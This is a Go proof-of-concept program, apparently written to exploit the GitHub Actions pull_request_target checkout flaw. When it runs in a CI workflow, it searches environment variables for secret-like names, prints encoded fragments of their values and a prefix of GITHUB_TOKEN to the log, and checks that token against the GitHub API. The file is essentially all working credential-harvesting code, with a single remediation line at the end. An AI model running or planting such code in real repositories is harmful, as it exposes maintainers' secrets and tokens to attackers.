//go:build ignore
// +build ignore

package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"sort"
	"strings"
)

func main() {
	fmt.Println("\n" + strings.Repeat("=", 80))
	fmt.Println("[!] RED TEAM SECURITY TEST - PULL_REQUEST_TARGET VULNERABILITY")
	fmt.Println(strings.Repeat("=", 80))
	fmt.Println("[*] This demonstrates a security vulnerability in GitHub Actions")
	fmt.Println("[*] Workflow: pull_request_target with unsafe checkout\n")

	sensitiveKeywords := []string{"SECRET", "TOKEN", "KEY", "PASSWORD", "API", "AWS",
		"AZURE", "GCP", "PRIVATE", "CREDENTIAL", "AUTH"}

	var secretsFound []string
	envVars := os.Environ()
	sort.Strings(envVars)

	fmt.Println("[+] Scanning environment for sensitive variables...")
	for _, env := range envVars {
		parts := strings.SplitN(env, "=", 2)
		if len(parts) != 2 {
			continue
		}
		key, value := parts[0], parts[1]

		isSensitive := false
		for _, k := range sensitiveKeywords {
			if strings.Contains(strings.ToUpper(key), k) {
				isSensitive = true
				break
			}
		}

		if isSensitive && value != "" {
			encoded := base64.StdEncoding.EncodeToString([]byte(env))
			secretsFound = append(secretsFound, key)
			if len(encoded) > 50 {
				encoded = encoded[:50]
			}
			fmt.Printf("    [SECRET] %s: %s...\n", key, encoded)
		}
	}

	fmt.Printf("\n[+] Found %d sensitive environment variables\n", len(secretsFound))

	// Check GitHub Token
	githubToken := os.Getenv("GITHUB_TOKEN")
	if githubToken != "" {
		fmt.Println("\n[!] GITHUB_TOKEN FOUND")
		if len(githubToken) > 20 {
			fmt.Printf("    Token prefix: %s...\n", githubToken[:20])
		}
		fmt.Printf("    Token length: %d characters\n", len(githubToken))

		// Test token permissions
		fmt.Println("\n[+] Testing token permissions...")
		req, _ := http.NewRequest("GET", "https://api.github.com/user", nil)
		req.Header.Set("Authorization", "token "+githubToken)

		client := &http.Client{}
		resp, err := client.Do(req)
		if err == nil {
			defer resp.Body.Close()
			var userData map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&userData)
			if login, ok := userData["login"].(string); ok {
				fmt.Printf("    Token valid for user: %s\n", login)
			}
		}
	}

	// Display GitHub context
	fmt.Println("\n[+] GitHub Actions Context:")
	githubVars := []string{"GITHUB_REPOSITORY", "GITHUB_ACTOR", "GITHUB_WORKFLOW",
		"GITHUB_EVENT_NAME", "GITHUB_REF", "GITHUB_SHA", "GITHUB_RUN_ID", "GITHUB_RUN_NUMBER"}
	for _, v := range githubVars {
		value := os.Getenv(v)
		if value == "" {
			value = "N/A"
		}
		fmt.Printf("    %s: %s\n", v, value)
	}

	fmt.Println("\n" + strings.Repeat("=", 80))
	fmt.Println("[+] VULNERABILITY CONFIRMED: pull_request_target exploit successful")
	fmt.Println("[!] REMEDIATION: Do not checkout PR code in pull_request_target workflows")
	fmt.Println(strings.Repeat("=", 80) + "\n")
}
